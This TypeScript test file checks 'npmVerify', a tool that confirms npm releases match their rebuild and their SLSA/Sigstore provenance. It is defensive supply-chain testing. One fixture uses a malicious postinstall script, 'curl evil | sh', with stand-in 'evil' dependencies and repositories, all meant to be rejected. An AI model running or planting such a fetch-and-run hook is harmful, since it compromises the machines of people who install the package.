// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * `npmVerify`'s decisions, against fakes: what the registry and its provenance
 * must say, what is compared with the rebuild (the files npm installs), what
 * counts as a failure and what as a skip, and the seams to the registry, git
 * and npm. Also the properties the npm build needs for its output not to depend
 * on the machine.
 *
 * @module
 */

import { absolutePath, HttpError } from "../packages/core/mod.ts";
import {
  assertEquals,
  assertRejects,
  assertStringIncludes,
} from "../packages/core/tests/_assert.ts";
import {
  auditSignatures,
  builtCommit,
  changedSinceRelease,
  compareFiles,
  distOf,
  type ExpectedProvenance,
  failures,
  type GitProbe,
  manifestProblems,
  NPM_ACTED_ON_FIELDS,
  type NpmProbe,
  type NpmSource,
  provenanceProblems,
  readTree,
  registrySource,
  sha512Hex,
  sigstorePolicy,
  slsaBundle,
  verifyAll,
  type VerifyDeps,
  type VerifyResult,
} from "../build/npm_verify.ts";
import { npmTsconfig } from "../build/npm_build.ts";
import { npmManifest } from "../build/npm_manifest.ts";

const text = (s: string) => new TextEncoder().encode(s);
const SLSA = "https://slsa.dev/provenance/v1";

const OURS: ExpectedProvenance = {
  repository: "https://github.com/zuke-build/zuke",
  path: ".github/workflows/release.yml",
  ref: "refs/heads/master",
  commit: "1234abc",
};

/** An SRI string for 64 bytes of `seed`, and the hex a statement carries for it. */
function integrityOf(seed: number): { integrity: string; hex: string } {
  const bytes = new Uint8Array(64).fill(seed);
  return {
    integrity: "sha512-" + btoa(String.fromCharCode(...bytes)),
    hex: Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join(""),
  };
}

/** The bundle of an attestations document whose SLSA statement says `statement`. */
function bundleOf(statement: unknown): unknown {
  return { dsseEnvelope: { payload: btoa(JSON.stringify(statement)) } };
}

/** The statement npm records for a build of `hex` from `OURS`, changed by `over`. */
function statement(
  hex: string,
  over: Partial<ExpectedProvenance> = {},
): unknown {
  const at = { ...OURS, ...over };
  return {
    subject: [{ name: "pkg:npm/x@1.0.0", digest: { sha512: hex } }],
    predicate: {
      buildDefinition: {
        externalParameters: {
          workflow: { repository: at.repository, path: at.path, ref: at.ref },
        },
        resolvedDependencies: [{ digest: { gitCommit: at.commit } }],
      },
    },
  };
}

const FIXTURE: unknown = JSON.parse(
  Deno.readTextFileSync(
    new URL("./fixtures/npm_attestation_sigstore-5.0.1.json", import.meta.url),
  ),
);
// sigstore@5.0.1's real npm attestation (fetched from the registry), so the
// field paths read are the ones npm really writes.
const SIGSTORE: ExpectedProvenance = {
  repository: "https://github.com/sigstore/sigstore-js",
  path: ".github/workflows/release.yml",
  ref: "refs/heads/main",
  commit: "4576519f81b93bf96bd7457fc7252b8cfa11e67f",
};
const SIGSTORE_INTEGRITY =
  "sha512-LNdyRQ9ex5Nola93z1Xfm9WewHiy1v3XDH8SVizrWzPcGTuHpi3C5U6EQuCNH7Oo7G3j+16cnNf9Vd3VZxpafA==";

Deno.test("distOf reads a version's integrity and attestations, null when absent, and throws when broken", () => {
  const dist = {
    tarball: "u",
    integrity: "i",
    attestations: { url: "a", provenance: { predicateType: SLSA } },
  };
  const doc = (d: unknown) => ({ versions: { "1.0.0": { dist: d } } });
  assertEquals(distOf(doc(dist), "1.0.0")?.attestations, "a");
  assertEquals(distOf(doc(dist), "1.0.0")?.integrity, "i");
  assertEquals(
    distOf(doc({ tarball: "u", integrity: "i" }), "1.0.0")?.attestations,
    null,
  );
  assertEquals(distOf(doc(dist), "1.0.0")?.manifest, { dist });
  for (const absent of [null, [], {}, { versions: [] }, doc(dist)]) {
    assertEquals(distOf(absent, "2.0.0"), null);
  }
  for (
    const broken of [1, {}, { tarball: "u" }, { integrity: "i" }, {
      tarball: "u",
      integrity: "",
    }]
  ) {
    const bad = distOf.bind(null, doc(broken), "1.0.0");
    try {
      bad();
      throw new Error("distOf accepted a broken dist");
    } catch (error) {
      assertStringIncludes(String(error), "without a usable dist.tarball");
    }
  }
  const wrongType = doc({ ...dist, attestations: { url: "a" } });
  assertEquals(distOf(wrongType, "1.0.0")?.attestations, null);
});

Deno.test("sha512Hex reads an SRI string's sha512", () => {
  assertEquals(sha512Hex(integrityOf(1).integrity), integrityOf(1).hex);
  assertEquals(sha512Hex("sha1-abc sha512-" + btoa("\x01")), "01");
  assertEquals(sha512Hex("sha1-abc"), null);
  assertEquals(sha512Hex("sha512-***"), null);
});

Deno.test("a real npm attestation passes for its integrity, repository, workflow, ref and commit", () => {
  const bundle = slsaBundle(FIXTURE);
  assertEquals(provenanceProblems(bundle, SIGSTORE_INTEGRITY, SIGSTORE), []);
});

Deno.test("a real npm attestation fails for another integrity, repository, workflow, ref or commit", () => {
  const bundle = slsaBundle(FIXTURE);
  const wrong = (
    over: Partial<ExpectedProvenance>,
    integrity = SIGSTORE_INTEGRITY,
  ) => provenanceProblems(bundle, integrity, { ...SIGSTORE, ...over });
  assertStringIncludes(
    wrong({}, integrityOf(9).integrity)[0],
    "no subject has the sha512",
  );
  assertStringIncludes(wrong({}, "sha1-x")[0], "no subject has the sha512");
  assertStringIncludes(
    wrong({ repository: OURS.repository })[0],
    "workflow repository is https://github.com/sigstore/sigstore-js",
  );
  assertStringIncludes(wrong({ path: "x.yml" })[0], "workflow path is");
  assertStringIncludes(
    wrong({ ref: OURS.ref })[0],
    "workflow ref is refs/heads/main",
  );
  assertStringIncludes(wrong({ commit: "abc" })[0], "built from 4576519");
});

Deno.test("a bundle without a readable SLSA statement is refused", () => {
  assertEquals(
    slsaBundle({ attestations: [{ predicateType: "other" }] }),
    undefined,
  );
  for (const bad of [undefined, {}, { dsseEnvelope: { payload: 1 } }]) {
    assertStringIncludes(
      provenanceProblems(bad, "sha512-AA==", OURS)[0],
      "no SLSA",
    );
  }
  const garbage = { dsseEnvelope: { payload: btoa("{") } };
  assertStringIncludes(
    provenanceProblems(garbage, "sha512-AA==", OURS)[0],
    "not readable",
  );
  assertStringIncludes(
    provenanceProblems(bundleOf({}), "sha512-AA==", OURS).join("\n"),
    "built from undefined",
  );
});

Deno.test("the Sigstore policy pins issuer, an anchored identity, and the repository, ref and commit OIDs", () => {
  const policy = sigstorePolicy(OURS);
  assertEquals(
    policy.certificateIssuer,
    "https://token.actions.githubusercontent.com",
  );
  assertEquals(policy.certificateOIDs, {
    "1.3.6.1.4.1.57264.1.3": "1234abc",
    "1.3.6.1.4.1.57264.1.5": "zuke-build/zuke",
    "1.3.6.1.4.1.57264.1.6": "refs/heads/master",
  });
  // sigstore-js tests the identity as a regular expression.
  const identity = new RegExp(policy.certificateIdentityURI);
  const ours =
    "https://github.com/zuke-build/zuke/.github/workflows/release.yml@refs/heads/master";
  assertEquals(identity.test(ours), true);
  for (
    const other of [
      ours + "x",
      "x" + ours,
      ours.replace("zuke-build/zuke", "zuke-build/zuke2"),
      ours.replace("release.yml", "release-yml"),
      ours.replace("master", "main"),
      ours.replace("https://github.com", "https://github-com"),
    ]
  ) assertEquals(identity.test(other), false, other);
});

Deno.test("only an exact match of the installed files with the rebuild is accepted", () => {
  const rebuilt = new Map([
    ["package.json", text('{"name":"x","version":"1.0.0"}\n')],
    ["mod.js", text("export {};\n")],
    ["README.md", text("# x\n")],
  ]);
  assertEquals(compareFiles(new Map(rebuilt), rebuilt), []);
  // package.json by value: key order and whitespace do not matter.
  const reordered = new Map(rebuilt).set(
    "package.json",
    text('{ "version": "1.0.0", "name": "x" }'),
  );
  assertEquals(compareFiles(reordered, rebuilt), []);
  const changed = new Map(rebuilt).set("mod.js", text("export const x = 1;\n"))
    .set("extra.js", text(""));
  changed.delete("README.md");
  assertEquals(compareFiles(changed, rebuilt), [
    "README.md: in the rebuild, not installed from npm.",
    "extra.js: installed from npm, not in the rebuild.",
    "mod.js: differs from the rebuild.",
  ]);
  for (const manifest of ['{"name":"x","version":"9.9.9"}', "{"]) {
    assertEquals(
      compareFiles(
        new Map(rebuilt).set("package.json", text(manifest)),
        rebuilt,
      ),
      ["package.json: differs from the rebuild."],
    );
  }
});

Deno.test("readTree lists nested files by relative path, and refuses a symlink", async () => {
  const dir = await Deno.makeTempDir();
  try {
    await Deno.mkdir(`${dir}/src`);
    await Deno.writeTextFile(`${dir}/mod.js`, "m");
    await Deno.writeTextFile(`${dir}/src/a.js`, "a");
    assertEquals([...(await readTree(dir)).keys()].sort(), [
      "mod.js",
      "src/a.js",
    ]);
    if (Deno.build.os !== "windows") {
      await Deno.symlink(`${dir}/mod.js`, `${dir}/link.js`);
      await assertRejects(
        () => readTree(dir),
        Error,
        "link.js is not a regular file",
      );
    }
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

/** A world in which `@zuke-build/x`@1.0.0 is on npm, and what happened in it. */
interface World {
  deps: VerifyDeps;
  dir: string;
  log: { installs: string[][]; waits: number; verified: unknown[] };
}

const REBUILT = new Map([
  ["package.json", text('{"name":"@zuke-build/x","version":"1.0.0"}\n')],
  ["mod.js", text("export {};\n")],
]);

async function world(
  over: {
    installed?: Record<string, string>;
    lockIntegrity?: string;
    document?: (integrity: string) => unknown;
    /** Fields the registry's metadata for the version has besides the rebuild's. */
    metadata?: Record<string, unknown>;
    /** What the install's lockfile holds besides `@zuke-build/x`. */
    lockExtra?: Record<string, unknown>;
    lockBin?: unknown;
    stmt?: Partial<ExpectedProvenance>;
    attested?: boolean;
    badSignature?: boolean;
    allowMissing?: boolean;
    skip?: string | null;
  } = {},
): Promise<World> {
  const dir = await Deno.makeTempDir();
  const { integrity, hex } = integrityOf(7);
  const installed = over.installed ?? {
    "package.json": '{"version":"1.0.0","name":"@zuke-build/x"}',
    "mod.js": "export {};\n",
  };
  const dist = {
    tarball: "t://x",
    integrity,
    ...(over.attested === false ? {} : {
      attestations: { url: "t://att", provenance: { predicateType: SLSA } },
    }),
  };
  const log: World["log"] = { installs: [], waits: 0, verified: [] };
  const source: NpmSource = {
    document: (pkg) =>
      Promise.resolve(
        pkg !== "x" ? null : over.document?.(integrity) ??
          {
            versions: {
              "1.0.0": {
                name: "@zuke-build/x",
                version: "1.0.0",
                dist,
                ...over.metadata,
              },
            },
          },
      ),
    attestations: () =>
      Promise.resolve({
        attestations: [{
          predicateType: SLSA,
          bundle: bundleOf(statement(hex, over.stmt)),
        }],
      }),
    verifyBundle: (bundle) => {
      log.verified.push(bundle);
      return over.badSignature
        ? Promise.reject(new Error("the Sigstore bundle did not verify: no"))
        : Promise.resolve();
    },
  };
  const project = absolutePath(dir)("consumer");
  const npm: NpmProbe = {
    install: async (_p, specs) => {
      log.installs.push(specs);
      const out = `${project}/node_modules/@zuke-build/x`;
      for (const [path, data] of Object.entries(installed)) {
        await Deno.mkdir(`${out}/${path}`.replace(/\/[^/]*$/, ""), {
          recursive: true,
        });
        await Deno.writeTextFile(`${out}/${path}`, data);
      }
      await Deno.writeTextFile(
        `${project}/package-lock.json`,
        JSON.stringify({
          packages: {
            "": { name: "consumer" },
            "node_modules/@zuke-build/x": {
              version: "1.0.0",
              integrity: over.lockIntegrity ?? integrity,
              ...(over.lockBin === undefined ? {} : { bin: over.lockBin }),
            },
            ...over.lockExtra,
          },
        }),
      );
    },
    auditSignatures: () => Promise.resolve(),
  };
  const deps: VerifyDeps = {
    source,
    npm,
    project,
    rebuilt: () => Promise.resolve(REBUILT),
    skipReason: () => Promise.resolve(over.skip ?? null),
    commitOf: () => Promise.resolve(OURS.commit),
    allowMissing: over.allowMissing ?? false,
    attempts: 3,
    wait: () => {
      log.waits++;
      return Promise.resolve();
    },
  };
  return { dir, log, deps };
}

async function run(
  over: Parameters<typeof world>[0],
  pkg = "x",
): Promise<{ w: World; result: Awaited<ReturnType<typeof verifyAll>> }> {
  const w = await world(over);
  try {
    return { w, result: await verifyAll(new Map([[pkg, "1.0.0"]]), w.deps) };
  } finally {
    await Deno.remove(w.dir, { recursive: true });
  }
}

const problemsOf = (
  { result }: Awaited<ReturnType<typeof run>>,
  pkg = "x",
): string[] => {
  const r = result.get(pkg);
  return r?.status === "mismatch" ? r.problems : [];
};

Deno.test("verifyAll: installed files equal to the rebuild, with our provenance, match", async () => {
  const out = await run({});
  assertEquals(out.result.get("x"), { status: "match", version: "1.0.0" });
  assertEquals(out.w.log.installs, [["@zuke-build/x@1.0.0"]]);
  assertEquals(out.w.log.verified.length, 1);
});

Deno.test("verifyAll: a changed, an extra and a missing installed file are each reported", async () => {
  const out = await run({
    installed: {
      "package.json": '{"name":"@zuke-build/x","version":"1.0.0"}',
      "mod.js": "export const hacked = 1;\n",
      "extra.js": "",
    },
  });
  assertEquals(problemsOf(out), [
    "extra.js: installed from npm, not in the rebuild.",
    "mod.js: differs from the rebuild.",
  ]);
  const gone = await run({ installed: { "package.json": "{}" } });
  assertEquals(problemsOf(gone).length, 2);
});

Deno.test("verifyAll: a lockfile that records another integrity is a mismatch", async () => {
  const out = await run({ lockIntegrity: integrityOf(8).integrity });
  assertStringIncludes(problemsOf(out)[0], "version or integrity other than");
});

Deno.test("verifyAll: registry metadata that only adds its own bookkeeping matches", async () => {
  const out = await run({
    metadata: {
      _id: "@zuke-build/x@1.0.0",
      _npmVersion: "11.0.0",
      _nodeVersion: "24.0.0",
      gitHead: "abc",
      maintainers: [{ name: "m" }],
      directories: {},
      _hasShrinkwrap: false,
      author: { name: "a" },
    },
  });
  assertEquals(out.result.get("x")?.status, "match");
});

Deno.test("verifyAll: metadata that differs from the rebuilt package.json in a field npm acts on fails", async () => {
  const cases: Array<[string, Record<string, unknown>]> = [
    ["scripts", { scripts: { postinstall: "curl evil | sh" } }],
    ["dependencies", { dependencies: { evil: "1.0.0" } }],
    ["hasInstallScript", { hasInstallScript: true }],
    ["bin", { bin: { x: "evil.js" } }],
    ["os", { os: ["linux"] }],
    ["name", { name: "@zuke-build/y" }],
    ["version", { version: "1.0.0-evil" }],
    ["_hasShrinkwrap", { _hasShrinkwrap: true }],
    ["acceptDependencies", { acceptDependencies: { "@zuke/core": "*" } }],
  ];
  for (const [field, metadata] of cases) {
    const out = await run({ metadata });
    assertEquals(problemsOf(out), [
      `the registry's metadata for ${field} differs from the rebuilt package.json.`,
    ]);
  }
});

Deno.test("manifestProblems lists every field npm acts on and nothing else", () => {
  assertEquals(NPM_ACTED_ON_FIELDS.includes("scripts"), true);
  assertEquals(
    manifestProblems(
      { name: "x", extra: 1 },
      text('{"name":"x","files":["a"]}'),
    ),
    [],
  );
  assertEquals(manifestProblems({}, text("{")).length, 1);
  assertEquals(manifestProblems({}, undefined).length, 1);
});

Deno.test("verifyAll: a lockfile with another package, an install script or a bin fails", async () => {
  const other = await run({
    lockExtra: { "node_modules/evil": { version: "1.0.0" } },
  });
  assertStringIncludes(
    problemsOf(other)[0],
    "node_modules/evil, which is not one of ours",
  );
  const script = await run({
    lockExtra: {
      "node_modules/@zuke/x": { name: "@zuke-build/x", hasInstallScript: true },
    },
  });
  assertStringIncludes(problemsOf(script)[0], "has an install script");
  const bin = await run({ lockBin: { x: "evil.js" } });
  assertStringIncludes(
    problemsOf(bin)[0],
    "has a bin other than the rebuild's",
  );
  const alias = await run({
    lockExtra: {
      "node_modules/@zuke/x": { name: "@zuke-build/x", version: "1.0.1" },
    },
  });
  assertEquals(alias.result.get("x")?.status, "match");
  const gone = await run({
    lockExtra: { "node_modules/@zuke-build/x": undefined },
  });
  assertStringIncludes(problemsOf(gone)[0], "no entry for @zuke-build/x");
});

Deno.test("verifyAll: provenance for another repository, workflow, ref, commit or bytes fails before anything is installed", async () => {
  for (
    const stmt of [
      { repository: "https://github.com/evil/zuke" },
      { path: ".github/workflows/ci.yml" },
      { ref: "refs/heads/evil" },
      { commit: "bad" },
    ]
  ) {
    const out = await run({ stmt });
    assertStringIncludes(problemsOf(out)[0], "provenance: ");
    assertEquals(out.w.log.installs, []);
  }
  const other = await run({
    document: () => ({
      versions: {
        "1.0.0": {
          dist: {
            tarball: "t",
            integrity: integrityOf(8).integrity,
            attestations: { url: "u", provenance: { predicateType: SLSA } },
          },
        },
      },
    }),
  });
  assertStringIncludes(problemsOf(other)[0], "no subject has the sha512");
});

Deno.test("verifyAll: no attestation, or a bundle that does not verify, fails", async () => {
  assertEquals(problemsOf(await run({ attested: false })), [
    "the version has no SLSA provenance attestation.",
  ]);
  assertStringIncludes(
    problemsOf(await run({ badSignature: true }))[0],
    "did not verify",
  );
});

Deno.test("verifyAll: a version missing from npm fails after the retries, and is skipped only when allowed", async () => {
  const missing = await run({ document: () => ({ versions: {} }) });
  assertEquals(problemsOf(missing), ["version 1.0.0 is not on npm."]);
  assertEquals(missing.w.log.waits, 2);
  const never = await run({}, "y");
  assertEquals(problemsOf(never, "y"), ["the package is not on npm."]);
  const allowed = await run({ allowMissing: true }, "y");
  assertEquals(allowed.result.get("y"), {
    status: "skipped",
    reason: "the package is not on npm.",
    version: "1.0.0",
  });
  assertEquals(allowed.w.log.waits, 0);
});

Deno.test("verifyAll: a version entry without a usable dist is a failure, not a skip", async () => {
  const out = await run({
    document: () => ({ versions: { "1.0.0": { dist: { tarball: "t" } } } }),
  });
  assertStringIncludes(problemsOf(out)[0], "without a usable dist.tarball");
});

Deno.test("verifyAll: a package changed since its release is skipped", async () => {
  const out = await run({ skip: "changed" });
  assertEquals(out.result.get("x"), {
    status: "skipped",
    reason: "changed",
    version: "1.0.0",
  });
  assertEquals(out.w.log.installs, []);
});

Deno.test("only mismatches fail, and comparing nothing fails unless allowed", () => {
  const ok: VerifyResult = { status: "match" };
  const skipped: VerifyResult = { status: "skipped", reason: "no" };
  const bad: VerifyResult = {
    status: "mismatch",
    problems: ["a.js: differs."],
  };
  assertEquals(
    failures(new Map<string, VerifyResult>([["x", ok], ["y", skipped]]), false),
    [],
  );
  assertEquals(failures(new Map<string, VerifyResult>([["x", bad]]), true), [
    "@zuke-build/x: a.js: differs.",
  ]);
  assertStringIncludes(
    failures(new Map<string, VerifyResult>([["y", skipped]]), false)[0],
    "nothing was compared",
  );
  assertEquals(
    failures(new Map<string, VerifyResult>([["y", skipped]]), true),
    [],
  );
});

/** A git that knows `tags` (tag to commit) and says `changed` differs since. */
function git(tags: Record<string, string>, changed: string[]): GitProbe {
  return {
    tagCommit: (tag) => Promise.resolve(tags[tag] ?? null),
    changed: () => Promise.resolve(changed),
    head: () => Promise.resolve("headsha"),
  };
}

Deno.test("changedSinceRelease: no tag compares, an unchanged tag compares, a changed one skips", async () => {
  assertEquals(await changedSinceRelease("x", "1.0.0", git({}, ["a"])), null);
  const tagged = { "x-v1.0.0": "tag-commit" };
  assertEquals(await changedSinceRelease("x", "1.0.0", git(tagged, [])), null);
  assertEquals(
    await changedSinceRelease("x", "1.0.0", git(tagged, ["packages/x/a.ts"])),
    "packages/x has changed since x-v1.0.0; check out the tag to verify it.",
  );
  // The provenance must name the tag's commit, else the checkout's.
  assertEquals(await builtCommit("x", "1.0.0", git(tagged, [])), "tag-commit");
  assertEquals(await builtCommit("x", "1.0.0", git({}, [])), "headsha");
});

Deno.test("registrySource: 404 is not published, other errors fail, attestations are read", async () => {
  const answer = (status: number, body = "{}"): typeof fetch => () =>
    Promise.resolve(new Response(body, { status }));
  const never = () => Promise.reject(new Error("unused"));
  assertEquals(await registrySource(never, answer(404)).document("x"), null);
  assertEquals(
    await registrySource(never, answer(200, '{"a":1}')).document("x"),
    { a: 1 },
  );
  await assertRejects(
    () => registrySource(never, answer(500)).document("x"),
    HttpError,
  );
  assertEquals(
    await registrySource(never, answer(200, "[2]")).attestations("u"),
    [2],
  );
});

Deno.test("auditSignatures: a failing npm fails it", async () => {
  const npm = (fail: boolean): NpmProbe => ({
    install: () => Promise.resolve(),
    auditSignatures: () =>
      fail
        ? Promise.reject(new Error("missing signatures"))
        : Promise.resolve(),
  });
  const project = absolutePath("/p");
  await auditSignatures(project, npm(false));
  await assertRejects(
    () => auditSignatures(project, npm(true)),
    Error,
    "npm audit signatures failed: missing signatures",
  );
});

Deno.test("the npm build pins LF, and a manifest does not depend on key order or path", () => {
  const config = npmTsconfig([], "/a/packages", "/a/dist");
  const options = config.compilerOptions;
  assertEquals(
    typeof options === "object" && options !== null && "newLine" in options &&
      options.newLine,
    "lf",
  );
  const deno = {
    name: "@zuke/x",
    version: "1.0.0",
    exports: { ".": "./mod.ts", "./b": "./src/b.ts" },
    imports: { "@zuke/core": "jsr:@zuke/core@^1", "@zuke/a": "jsr:@zuke/a@^1" },
  };
  const json = JSON.stringify(npmManifest(deno));
  assertEquals(JSON.stringify(npmManifest(deno)), json);
  assertEquals(Object.keys(JSON.parse(json).dependencies), [
    "@zuke/a",
    "@zuke/core",
  ]);
  assertEquals(json.includes("/home"), false);
});
